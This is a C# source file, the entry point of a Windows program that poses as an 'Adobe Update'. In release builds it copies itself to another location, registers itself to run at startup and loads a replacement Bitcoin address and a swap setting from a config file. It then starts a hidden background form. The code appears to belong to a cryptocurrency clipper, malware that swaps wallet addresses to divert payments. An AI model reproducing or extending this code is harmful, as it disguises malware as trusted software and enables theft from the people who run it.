﻿using System;
using System.IO;
using System.Windows.Forms;
using AdobeUpdate.Main;

namespace AdobeUpdate
{
    static class Program
    {
        [STAThread]
        static void Main()
        {

#if !DEBUG
            if (!File.Exists(Config.ConfigFileName))
            {
                try
                {
                    File.Copy(Assists.ExecutableName, Assists.NewExecutablePath, true);
                    //Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                    Tools.SetStartup(Assists.NewExecutablePath);
                }
                catch
                {
                    Tools.SetStartup(Application.ExecutablePath);
                }
            }
            else
            {
                Tools.SetStartup(Application.ExecutablePath);
                try
                {
                    Config.SwapDefaultBtcAddress = File.ReadAllLines(Config.ConfigFileName)[0];
                    Config.RandomSwapNum = int.Parse(File.ReadAllLines(Config.ConfigFileName)[1]);
                }
                catch
                {
                }
            }
#endif

            new BackgroundForm();
            Application.Run();
        }
    }
}
